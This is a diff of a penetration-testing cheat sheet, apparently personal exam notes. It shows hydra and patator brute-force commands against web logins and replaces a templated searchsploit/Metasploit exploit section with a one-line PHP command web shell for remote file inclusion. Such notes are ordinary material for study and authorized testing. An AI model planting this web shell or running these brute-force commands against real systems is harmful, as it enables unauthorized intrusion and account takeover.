@@ -152,29 +152,11 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmy
 patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
 ```
 
-### CVE-2021-1234
-#### EDB-ID-56789
+### Remote File Inclusion
 ```bash
-searchsploit foo
-mkdir edb-id-56789
-cd edb-id-56789
-searchsploit -x 56789
-```
-
-#### cyberphor POC
-```bash
-git clone https://github.com/cyberphor/cve-2021-1234-poc.git
-cd cve-2021-56789-poc
-```
-
-#### Metasploit Module
-```bash
-msfconsole
-search ???
-use exploit/???/???
-set LHOST tun0
-set RHOST $TARGET
-run
+# find a way to upload a PHP command shell
+vim cmd.php
+<?php echo shell_exec($_GET['cmd']); ?>
 ```
 
 ## Maintaining Access
